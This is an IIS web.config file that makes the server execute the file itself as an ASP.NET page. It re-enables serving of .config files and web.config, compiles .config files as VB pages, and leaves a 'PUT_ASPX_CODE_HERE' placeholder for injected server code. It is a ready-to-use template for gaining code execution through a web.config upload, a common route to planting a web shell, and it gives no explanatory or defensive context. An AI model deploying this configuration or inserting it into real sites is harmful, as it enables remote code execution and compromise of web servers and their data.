<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers accessPolicy="Read, Script, Write">
            <add name="web_config" path="web.config" verb="*" type="System.Web.UI.PageHandlerFactory" modules="ManagedPipelineHandler" requireAccess="Script" preCondition="integratedMode" /> 
            <add name="web_config-Classic" path="web.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll" requireAccess="Script" preCondition="classicMode,runtimeVersionv4.0,bitness64" /> 
        </handlers>
        <security>
            <requestFiltering>
                <fileExtensions>
                    <remove fileExtension=".config" />
                </fileExtensions>
                <hiddenSegments>
                    <remove segment="web.config" />
                </hiddenSegments>
            </requestFiltering>
        </security>
        <validation validateIntegratedModeConfiguration="false" /> 
    </system.webServer>
    <system.web>
        <compilation defaultLanguage="vb">
            <buildProviders> <add extension=".config" type="System.Web.Compilation.PageBuildProvider" /> </buildProviders>
        </compilation>
        <httpHandlers> 
            <add path="web.config" type="System.Web.UI.PageHandlerFactory" verb="*" /> 
        </httpHandlers> 
    </system.web>
</configuration>
<!--

PUT_ASPX_CODE_HERE

-->
